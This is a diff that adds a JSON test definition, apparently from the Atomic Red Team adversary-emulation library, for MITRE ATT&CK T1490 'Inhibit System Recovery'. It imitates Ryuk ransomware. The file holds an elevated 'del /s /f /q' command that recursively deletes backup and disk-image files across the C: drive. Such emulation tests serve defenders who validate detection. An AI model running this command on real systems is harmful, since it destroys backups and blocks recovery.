@@ -1,0 +1,24 @@
+{
+    "name": "Windows - Delete Backup Files",
+    "description": "Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many access is denied messages will appear as the commands try to delete files from around the system. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk\n",
+        "name": "command_prompt",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1490",
+    "tactics": [
+        "Impact"
+    ],
+    "technique": "Inhibit System Recovery",
+    "source": "ART",
+    "uuid": "6b1dbaf6-cc8a-4ea6-891f-6058569653bf",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
